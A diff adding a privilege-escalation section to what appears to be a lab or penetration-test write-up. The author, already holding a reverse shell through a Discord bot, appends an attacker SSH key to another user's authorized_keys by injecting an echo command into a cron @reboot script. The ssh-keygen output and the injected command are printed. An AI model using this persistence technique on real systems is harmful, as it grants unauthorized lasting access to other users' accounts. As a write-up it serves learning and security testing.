@@ -132,3 +132,51 @@ With the username set, I simply interacted with the bot by sending the command:
 Once i obtained a reberse shell, and i was able to navigate inside the user-a folder, accessing all doscord bot's files, including user-b's script `server_start.sh`
 
 ![Nat Configuration](images/Initial_Access.png)
+
+But i did not have access rights to user-b folder, containing the game server's files
+![Nat Configuration](images/Screenshot_tree.png)
+
+
+
+
+## Privilege Escalation
+
+One way to gain access to the `/home/user-b` files was to modify the `server_start.sh` script. Since this script is executed by a cron job with the `@reboot` directive, any modification would be executed automatically on the next server reboot, running with `user-b`'s privileges.
+
+However, relying on server restarts each time to execute arbitrary code would be impractical. Therefore, to gain persistent access as `user-b`, I injected a public SSH key into `user-b`'s `authorized_keys` file. This allowed me to establish an SSH connection directly as `user-b`, granting continuous access to the required files without waiting for server reboots.
+
+First, I generated an SSH key pair using `ssh-keygen`:
+
+```
+$ ssh-keygen
+Generating public/private ed25519 key pair.
+Enter file in which to save the key (/home/attacker/.ssh/id_ed25519): /home/attacker/.ssh/innocent_key
+Enter passphrase (empty for no passphrase):
+Enter same passphrase again:
+Your identification has been saved in /home/attacker/.ssh/innocent_key
+Your public key has been saved in /home/attacker/.ssh/innocent_key.pub
+The key fingerprint is:
+SHA256:choqayqE6Q8JhczNELYiT7055YgjVS9IVNSOgiAP5XM attacker@attacker
+The key's randomart image is:
++--[ED25519 256]--+
+| *=o+.           |
+|B+=+ ..          |
+|*BBoEoo          |
+|+=o+.B.          |
+|+.+.= + S        |
+|+o.. o =         |
+|oo. . .          |
+|..oo             |
+|ooo.             |
++----[SHA256]-----+
+```
+
+Then, I appended the generated public key to `user-b`'s `authorized_keys` by modifying `server_start.sh` as follows:
+
+```
+echo "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGzTv8FEFTYsiVF7rOQFz/+Zme92ZgdrAvfe0KavA4xA'
+>> /home/user-b/.ssh/authorized_keys" >> server_start.sh
+```
+
+This ensured that, upon the next reboot, the server would automatically add the attacker's public key, granting SSH access as `user-b`.
+
